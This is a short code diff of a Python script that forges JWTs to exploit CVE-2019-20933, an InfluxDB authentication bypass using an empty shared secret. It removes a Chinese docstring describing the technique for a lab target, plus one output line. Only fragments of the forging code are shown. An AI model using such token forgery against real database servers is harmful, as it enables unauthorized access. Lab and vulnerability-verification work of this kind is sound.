@@ -1,14 +1,3 @@
-#!/usr/bin/env python3
-"""为 CVE-2019-20933 手工构造 JWT（InfluxDB 空 shared-secret 认证绕过）。
-
-用法：
-    python forge_token.py                 # 用空密钥签名（打未修复的靶场）
-    python forge_token.py --secret xxx    # 用指定密钥签名（验证修复后正常用户仍可用）
-    python forge_token.py --user admin --ttl 86400
-
-为什么不用 PyJWT：PyJWT 2.x 主动拒绝空密钥（InvalidKeyError: HMAC key must not be empty）。
-而本漏洞的关键正是「用空密钥签名」，所以这里用标准库手工拼 header.payload.signature。
-"""
 import argparse
 import base64
 import hashlib
@@ -43,7 +32,6 @@ def main() -> None:
     token = forge(args.user, args.secret, args.ttl)
     print(token)
     head, body, sig = token.split(".")
-    print("\n# JWT 三段结构（报告里可以这样讲）：", flush=True)
     for name, seg in (("header", head), ("payload", body)):
         pad = "=" * (-len(seg) % 4)
         decoded = base64.urlsafe_b64decode(seg + pad).decode(errors="replace")
